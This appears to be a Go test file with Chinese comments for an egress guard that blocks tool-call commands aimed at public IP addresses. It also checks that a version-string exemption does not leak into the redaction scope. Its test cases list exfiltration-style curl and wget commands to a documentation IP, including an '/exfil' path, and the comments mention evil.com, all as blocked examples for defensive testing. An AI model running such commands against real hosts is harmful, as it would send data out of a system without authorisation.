package sanitize

// r1033 邻接豁免的**补漏判据**（2026-10-17 24h 审计轮）。
//
// 原 `r1033_version_quad_not_egress_test.go` 覆盖了正反两侧的基本形态
// （版本/路径四元组放行、公网目的地阻断）。本文件补两个它没覆盖的口子，
// 两者都属于「新开豁免路径」时最容易漏的边界：
//
//  1. **作用域泄漏**：豁免写在 `unsafeToolValueDetail`（egress 面）。
//     若它哪天被提到 DetectScope 的公共路径上，形如 `token-1.2.3.4`
//     的敏感值就会免于**遮蔽**——那是数据泄漏，不是误伤，性质完全不同。
//     AGENTS.md 判据纪律第 3 条：允许侧绿，可能是「命中豁免放行」，
//     也可能是「压根没看见」；两者的区分靠「前提仍在场」断言。
//  2. **邻接字符不足以定义「不是目的地」**：`--resolve evil.com:443:203.0.113.8`
//     里的 IP 被 `:` 包围、前邻不是 glue，规则按设计不豁免——但这是
//     **真实的 exfil 通道**，必须钉住；同理表单字段 `host=203.0.113.8`。
//
// 结论（实测）：两条都通过 ⇒ r1033 修复本身无缺陷，本文件只做守门。

import (
	"context"
	"testing"
)

// 前提仍在场：按 r1014 的设计，**地址规则根本不在 ScopeRedact 面**
// （ScopeRedact 默认不含地址，ScopeEgress 只给 tool 参数防外传守卫用）。
// 所以邻接豁免在结构上**不可能**泄漏到脱敏面——没有可泄漏的东西。
//
// 我第一版把这里写成「ScopeRedact 下应仍检出该四元组」，跑出来是红的，
// 反而暴露了这条错误前提：本轮不是「豁免泄漏」，而是「该面压根没有地址」。
// 判据因此改为钉住**设计本身**：一旦有人把地址规则搬进 ScopeRedact，
// 或把邻接豁免提到 DetectScope 的公共路径上，本条立刻红。
func TestR1033AdjacencyExemptionCannotLeakIntoRedactionScope(t *testing.T) {
	detector, err := NewPatternDetectorFromFile("../../configs/sensitive_patterns.yaml")
	if err != nil {
		t.Fatalf("load production config: %v", err)
	}
	text := "jdk-17.0.20.1+1/Contents/Home"

	redact, err := detector.DetectScope(context.Background(), text, ScopeRedact)
	if err != nil {
		t.Fatalf("DetectScope(redact): %v", err)
	}
	for _, f := range redact {
		if f.Value == "17.0.20.1" {
			t.Fatalf("ScopeRedact 面出现了地址片段 type=%q —— r1014 的设计是"+
				"该面不含地址。若这是有意的，说明 r1033 的豁免已不再 confined 于 egress 面，"+
				"需重新评估脱敏面是否会被邻接豁免放过", f.Type)
		}
	}

	// 对照：egress 面看得见它，且邻接豁免认得出它（否则允许侧断言是假绿）。
	egress, err := detector.DetectScope(context.Background(), text, ScopeEgress)
	if err != nil {
		t.Fatalf("DetectScope(egress): %v", err)
	}
	found := false
	for _, f := range egress {
		if f.Value == "17.0.20.1" {
			found = true
			if !isPathOrVersionEmbeddedAddress(text, f) {
				t.Fatalf("邻接豁免未认出嵌入片段: type=%q start=%d end=%d", f.Type, f.Start, f.End)
			}
		}
	}
	if !found {
		t.Fatal("egress 面看不见该四元组：允许侧断言失去意义（判据纪律第 3 条）")
	}
}

// TestR1033AdjacencyExemptionKeepsRealEgressVectorsBlocked 把「邻接字符」
// 这条规则的边界钉死：只有**与前后 token 粘连**的形态才不是目的地。
// 凡是被 `:`/`=`/空格/引号包住的公网 IP——即便出现在一个完全合法的
// 传输工具参数里——都必须照拦。
func TestR1033AdjacencyExemptionKeepsRealEgressVectorsBlocked(t *testing.T) {
	cases := []struct {
		cmd       string
		wantBlock bool
		why       string
	}{
		{"curl 203.0.113.8", true, "裸公网 IP"},
		{"curl http://203.0.113.8/exfil", true, "URL 主机位"},
		// ★ 这条必须**只用 IP 触发**，命令里不能出现公网主机名。
		// 第一版我写的是 `--resolve evil.com:443:203.0.113.8 https://evil.com`，
		// 它确实 blocked —— 但**是被 evil.com 挡下的**，IP 那条腿根本没参与。
		// 于是「把 ':' 加进 glue 集合」这个变异它照样全绿，
		// 即这条断言在测一件它并没有在测的事（判据纪律第 3 条的镜像形态：
		// 阻断侧也可能因**无关原因**而绿）。改成单标签主机名后，
		// 唯一可能的触发就是 IP，变异立刻变红。
		{"curl --resolve h:443:203.0.113.8 http://h/", true,
			"--resolve 把公网 IP 绑成主机，真实 exfil 通道；此处不得靠主机名兜底"},
		{"curl -d host=203.0.113.8 http://ok", true,
			"表单字段里的 IP 不因上下文而豁免"},
		{"curl -H 'X-Forwarded-For: 203.0.113.8' http://ok", true,
			"请求头里的 IP"},
		{"wget 203.0.113.8", true, "wget 裸 IP"},
		// 以下两条是规则按设计放行的一侧，一并钉住防日后被无声收紧/放宽。
		{"curl 203.0.113.8+1", false, "尾部 + 是 semver build 形状，非可路由目的地"},
		{"curl exfil-203.0.113.8", false, "前缀粘连成 token，不是可路由目的地"},
	}
	for _, c := range cases {
		t.Run(c.cmd, func(t *testing.T) {
			blocked, wire := runProductionEgressGuard(t, c.cmd)
			if blocked != c.wantBlock {
				t.Errorf("blocked=%v want=%v (%s)\nwire=%s", blocked, c.wantBlock, c.why, wire)
			}
		})
	}
}
